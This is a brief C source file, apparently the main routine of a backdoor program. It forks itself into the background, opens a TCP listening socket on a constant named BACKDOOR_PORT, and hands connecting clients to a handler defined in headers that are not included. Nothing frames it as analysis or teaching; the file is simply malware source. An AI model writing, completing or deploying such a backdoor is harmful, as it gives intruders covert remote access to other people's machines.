#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include "socket_tools.h"
#include "tools.h"

int sock=0; 

void bd_exit(void){
	if(sock) close(sock); 
}

int main(int argc, char *argv[]){
	if(fork()!=0) exit(0);
	atexit(bd_exit); 
	sock=tcp_svr_create_socket(BACKDOOR_PORT); 
	tcp_svr_select_n_handle(sock, 1, tcp_svr_handle_cli); 
	if(sock) close(sock);
	return 0; 
}

